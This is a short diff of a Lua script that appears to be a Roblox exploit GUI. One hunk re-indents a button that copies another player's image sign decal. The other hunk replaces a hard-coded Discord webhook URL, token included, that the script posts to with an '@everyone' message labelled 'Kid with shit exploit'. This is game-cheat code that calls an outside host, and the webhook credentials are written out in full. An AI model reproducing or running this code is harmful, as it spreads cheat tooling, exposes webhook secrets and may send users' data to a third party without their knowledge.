@@ -267,7 +267,7 @@ TextBox = Page3:CreateBox("Type in target here", 10044538000, function(arg)
 end)
 Button = Page3:CreateButton("Copy Image Sign Decal", "Copys the given player names img sign decal", function()
     if CopyDecalPlayer then
-    local imageSign = game.Workspace:FindFirstChild(CopyDecalPlayer):FindFirstChild("Image Sign") or game.Players:FindFirstChild(CopyDecalPlayer).Backpack:FindFirstChild("Image Sign")
+        local imageSign = game.Workspace:FindFirstChild(CopyDecalPlayer):FindFirstChild("Image Sign") or game.Players:FindFirstChild(CopyDecalPlayer).Backpack:FindFirstChild("Image Sign")
         if imageSign then
             local imageLabel = imageSign.Body.SurfaceDisplayGui.Frame:FindFirstChild("ImageLabel")
             if imageLabel and imageLabel.Image and string.find(imageLabel.Image, "rbxassetid://") then
@@ -723,7 +723,7 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1095013969724444722/FL26iVSy9IRZ8W0NvEftIuirJVtMQJcuqI23hJZkUVvnLc28MZZJuD0J7xh6kS7ZziZ0"
+   "https://discord.com/api/webhooks/1096125310270963802/vuOdpQJid0YhfRTJydZzAnBIWmoy4ZOWCeQVEu7f4EzMFpI3XHYN3Oy1CuW9Oyvo4C4E"
 
 local data = {
    ["content"] = " @everyone",
